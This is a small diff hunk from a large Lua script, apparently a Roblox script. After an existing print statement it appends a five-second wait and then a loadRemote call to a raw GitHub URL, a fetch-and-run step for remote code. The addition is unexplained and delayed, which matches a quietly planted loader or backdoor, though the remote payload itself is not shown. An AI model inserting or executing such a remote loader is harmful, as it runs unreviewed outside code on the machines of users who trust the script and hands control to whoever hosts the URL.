@@ -2918,3 +2918,6 @@ task.spawn(function()
 end)
 
 print("UWUV2")
+
+task.wait(5)
+loadRemote("https://raw.githubusercontent.com/67Studio/A/refs/heads/main/AGENTE")
